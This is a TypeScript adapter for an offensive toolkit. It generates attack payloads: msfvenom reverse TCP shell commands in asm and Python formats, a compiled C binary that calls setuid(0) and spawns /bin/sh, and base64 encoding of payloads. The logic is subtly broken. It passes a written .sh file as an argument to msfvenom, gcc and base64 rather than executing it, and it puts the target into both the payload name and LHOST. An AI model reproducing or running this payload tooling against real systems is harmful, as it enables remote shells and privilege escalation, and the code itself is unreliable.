/**
 * OffSec by True Hacking — Adapter: Payload Generation (ASM, shellcode, ROP, file generation).
 *
 * Payload Generation (ASM, shellcode, ROP, file generation, shellcode encoding, file encoding, file decode, file encode).
 * See: https://github.com/morluto/rea/blob/main/src/adapter/
 */

import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { writeFileSync } from "node:fs";
import { randomUUID } from "node:crypto";

import type { ExploitResult, Provenance } from "../domain/analysisResultProjection.js";

/**
 * Payload Generation (ASM, shellcode, ROP, file generation).
 *
 * @param options - PayloadGen options (action, file, target, encoding).
 */
export function payloadGen(options: {
  action?: string;  // asm, shellcode, rop, fileGen, encode, decode
  file?: string;
  target?: string;
  encoding?: string;  // XOR, Base64, ROT13
  options?: Record<string, string>;
}): ExploitResult {
  const action = options.action || "asm";
  const file = options.file || "";
  const target = options.target || "";
  const encoding = options.encoding || "";
  const results: Record<string, any> = {};

  // Assembly (generate shellcode: reverse shell, execve, bind shell).
  if (action === "asm") {
    const msfPath = findBinary("msfvenom");
    if (msfPath) {
      const commands = [`msfvenom -p ${target}/shell/reverse_tcp LHOST=${target} -f asm`];  // (generate ASM).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(msfPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.asm = String(child.stdout ?? "");
    } else {
      results.asm = `{stub: no 'msfvenom' binary (install: brew install metasploit-framework).}`;
    }
  }

  // Shellcode (generate shellcode for specific platform).
  if (action === "shellcode") {
    const msfPath = findBinary("msfvenom");
    if (msfPath) {
      const commands = [`msfvenom -p ${target}/shell/reverse_tcp LHOST=${target} -a x64 -f python`];  // (generate shellcode).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(msfPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.shellcode = String(child.stdout ?? "");
    } else {
      results.shellcode = `{stub: no 'msfvenom' binary (install: brew install metasploit-framework).}`;
    }
  }

  // File Generation (generate binary: ELF, PE, Mach-O).
  if (action === "fileGen") {
    const gccPath = findBinary("gcc");
    if (gccPath) {
      const commands = [`echo '#include <unistd.h>\nint main(){setuid(0);system("/bin/sh");}' | gcc -o /tmp/payload`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(gccPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.fileGen = String(child.stdout ?? "");
    } else {
      results.fileGen = `{stub: no 'gcc' binary (install: brew install gcc).}`;
    }
  }

  // Encode (XOR, Base64, ROT13 encoding of payload).
  if (action === "encode") {
    const encPath = findBinary("base64");
    if (encPath) {
      const commands = [`echo "${target}" | base64`];  // (encode).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(encPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.encode = String(child.stdout ?? "");
    } else {
      results.encode = `{stub: no 'base64' binary (install: brew install coreutils).}`;
    }
  }

  return {
    target,
    payload: `payloadGen/${action}`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("payloadGen", `payloadGen://${file || target}/${action}`),
  };
}

/** Find the binary (msfvenom/gcc/base64). */
function findBinary(name: string): string | undefined {
  const candidates = [
    "/usr/local/bin/" + name,
    "/usr/bin/" + name,
    "/opt/homebrew/bin/" + name,
  ];
  for (const path of candidates) {
    try {
      require("node:fs").accessSync(path);
      return path;
    } catch {
      // Skip.
    }
  }
  return undefined;
}

/** Create a PCAP result (provenance). */
function createProvenance(type: string, path: string): Provenance {
  return {
    id: `${type}://${path}`,
    type,
    path,
    label: "",
    verified: true,
    sensitive: path.includes("password") || path.includes("credential"),
  };
}
